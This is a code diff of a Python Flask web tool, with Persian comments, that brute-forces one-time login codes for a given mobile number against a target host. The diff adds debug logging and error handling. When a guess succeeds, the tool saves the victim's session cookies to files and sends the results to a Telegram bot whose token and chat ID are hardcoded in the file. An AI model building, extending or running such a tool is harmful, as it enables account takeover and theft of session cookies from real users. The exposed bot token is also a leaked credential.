@@ -4,10 +4,11 @@ from http.cookiejar import MozillaCookieJar
 from concurrent.futures import ThreadPoolExecutor
 import time
 import sys
-from flask import Flask, render_template_string, request  # اصلاح‌شده
+from flask import Flask, render_template_string, request
 from flask_socketio import SocketIO, emit
 import threading
 
+# تنظیمات تلگرام (اینجا توکن و آیدی چتت رو بذار)
 # تنظیمات تلگرام (اینجا توکن و آیدی چتت رو بذار)
 TELEGRAM_BOT_TOKEN = "5858689331:AAH3pdfEDVSIF9AaPsWCGQiZzltgkKVtKr8"  # توکن رباتت رو اینجا بذار
 TELEGRAM_CHAT_ID = "102046811"     # آیدی چتت رو اینجا بذار
@@ -79,20 +80,17 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retrie
                            f"Redirect to: {json_response['data']['redirect']}")
                     progress_log.append(msg)
                     socketio.emit('update_progress', {'log': msg})
-
                     cookie_jar = MozillaCookieJar(f"cookies_success_{code_str}.txt")
                     for cookie in response.cookies:
                         cookie_jar.set_cookie(cookie)
                     cookie_jar.save(ignore_discard=True, ignore_expires=True)
                     progress_log.append(f"Cookies saved in cookies_success_{code_str}.txt")
                     socketio.emit('update_progress', {'log': progress_log[-1]})
-
                     output_file = f"success_{code_str}.txt"
                     with open(output_file, 'w', encoding='utf-8') as f:
                         f.write(msg + f"\nCookies file: cookies_success_{code_str}.txt\n")
                     progress_log.append(f"Output saved in {output_file}")
                     socketio.emit('update_progress', {'log': progress_log[-1]})
-
                     send_file_to_telegram(output_file)
                     return True
                 else:
@@ -117,11 +115,15 @@ def generate_code(counter):
 
 def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_range):
     global running, found_success
+    progress_log.append(f"Starting bruteforce from {start_range} to {end_range}...")  # پیام تست
+    socketio.emit('update_progress', {'log': progress_log[-1]})
     batch_size = connections
     found_success = False
 
     for batch_start in range(start_range, end_range, batch_size):
         if not running or found_success:
+            progress_log.append("Process stopped manually or due to success!")
+            socketio.emit('update_progress', {'log': progress_log[-1]})
             break
 
         batch_end = min(batch_start + batch_size, end_range)
@@ -215,11 +217,16 @@ def index():
             const stopBtn = document.getElementById('stop');
             const progressDiv = document.getElementById('progress');
 
+            socket.on('connect', () => {
+                console.log('Connected to WebSocket');
+            });
+
             socket.on('update_progress', function(data) {
+                console.log('Received update:', data);  // دیباگ برای چک کردن پیام‌ها
                 const log = document.createElement('p');
                 log.textContent = data.log;
                 progressDiv.appendChild(log);
-                progressDiv.scrollTop = progressDiv.scrollHeight;
+                progressDiv.scrollTop = progressDiv.scrollTop = progressDiv.scrollHeight;
             });
 
             startBtn.addEventListener('click', () => {
@@ -235,10 +242,14 @@ def index():
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ host, nonce, mobile, connections, startRange, endRange })
-                }).then(() => {
-                    startBtn.disabled = true;
-                    stopBtn.disabled = false;
-                });
+                }).then(response => {
+                    if (response.ok) {
+                        startBtn.disabled = true;
+                        stopBtn.disabled = false;
+                    } else {
+                        console.error('Start failed:', response.status);
+                    }
+                }).catch(error => console.error('Fetch error:', error));
             });
 
             stopBtn.addEventListener('click', () => {
@@ -267,6 +278,8 @@ def start():
 
     running = True
     progress_log = []
+    progress_log.append("Start button clicked!")  # پیام تست
+    socketio.emit('update_progress', {'log': progress_log[-1]})
     threading.Thread(target=run_bruteforce, args=(host, login_otp_nonce, mobile, connections, start_range, end_range)).start()
     return '', 204
 
@@ -274,6 +287,8 @@ def start():
 def stop():
     global running
     running = False
+    progress_log.append("Stop button clicked!")  # پیام تست
+    socketio.emit('update_progress', {'log': progress_log[-1]})
     return '', 204
 
 if __name__ == '__main__':
